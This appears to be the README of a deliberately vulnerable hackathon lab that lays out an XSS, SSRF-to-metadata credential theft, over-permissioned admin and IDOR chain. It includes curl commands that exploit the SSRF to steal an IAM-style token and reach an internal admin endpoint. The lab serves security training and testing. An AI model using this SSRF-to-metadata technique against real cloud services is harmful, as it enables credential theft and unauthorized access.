# Attack sandbox

An authorized security-research honeypot built for Cyberdefense Hackathon
#SFTechWeek (Oct 9, 2026) — the "attack surface" leg of a four-part project
(attack surface / attack / detection / remediation; Patrick attacks this,
detection is `walmsley-lab/cyber-defense`, remediation is a PR into
`manvendersingh21/closeloop`). One repo, two environments:

- **This top level — Akash.** Three custom services (storefront, metadata,
  internal-api) deployed on Akash, using Akash's internal-vs-global network
  boundary as part of the attack surface. The live Akash deployment
  currently runs OWASP Juice Shop instead (`deploy-juiceshop.yaml`) as the
  simpler, zero-build attack vector; the custom chain below is still here,
  buildable via `../.github/workflows/attack-surface-build.yml` → `ghcr.io`.
- **`k8s/` — a real local Kubernetes cluster** (`kind` + Calico), with a
  NetworkPolicy misconfiguration and an RBAC over-permission as two
  independent escape paths, plus a live Svelte dashboard. See
  [`k8s/README.md`](k8s/README.md).

`VULNERABILITY_FORMAT.md` documents every finding from both environments in
the shared `exploit-handoff/v1` contract shape (from `closeloop` issue #1).

## Akash: the chain

## The chain

```
          PUBLIC (global:true)              INTERNAL ONLY (service: storefront)
        ┌─────────────┐                     ┌──────────┐      ┌──────────────┐
attacker│ storefront  │── SSRF (/preview) ──▶│ metadata │      │ internal-api │
   ────▶│  :8080      │                      │  :4001   │      │   :4000      │
        └─────────────┘                      └──────────┘      └──────────────┘
              │                                    │                   ▲
       reflected XSS                      leaks IAM_TOKEN               │
        (warm-up bug)                     (fake cloud creds)    stolen token used
                                                                  as the admin credential
```

1. **Warm-up — reflected XSS** (`storefront` `/search?q=`, CWE-79). Steal the
   `session` cookie (a fake flag) to prove the bug.
2. **The real chain — SSRF to cloud metadata** (`storefront` `/preview?url=`,
   CWE-918). `internal-api` and `metadata` are **not** publicly reachable —
   only `storefront` can reach them on Akash's internal network. Pivot
   through the SSRF to request `metadata`'s IMDS-style endpoint and steal
   its "IAM credential."
3. **Payoff — excessive permissions** (`internal-api` `/internal/admin`,
   CWE-269). The stolen credential is accepted with no further checks. This
   mirrors the real Capital One breach pattern (SSRF → IMDS → stolen
   credential → data access), and matches this hackathon's own
   `exploit-handoff/v1` contract example almost exactly.
4. **Bonus — IDOR** (`internal-api` `/internal/users/:id`, CWE-639). No auth
   at all; increment the id.

## Exploiting it end to end (via the SSRF proxy, no direct network access needed)

```bash
BASE=https://<your-deployment-url>

# 1. steal the fake IAM token through the SSRF
curl "$BASE/preview?url=http://metadata:4001/latest/meta-data/iam/security-credentials/deploy-role"
# -> {"Token": "..."} copy it

# 2. use it against the internal admin endpoint, again through the SSRF
curl "$BASE/preview?url=http://internal-api:4000/internal/admin%3Ftoken%3D<TOKEN>"
# -> {"flag": "FLAG{...}", "customers": [...]}
```

## Deploy

Build happens in CI (`../.github/workflows/attack-surface-build.yml` → `ghcr.io`, no local
Docker needed). Then on [console.akash.network](https://console.akash.network):
paste `deploy.yaml`, pick a provider, deploy. Only `storefront` is public.

## Data

Every "credential," "customer," and "flag" here is fabricated for this lab.
Nothing in this repo is a real secret.
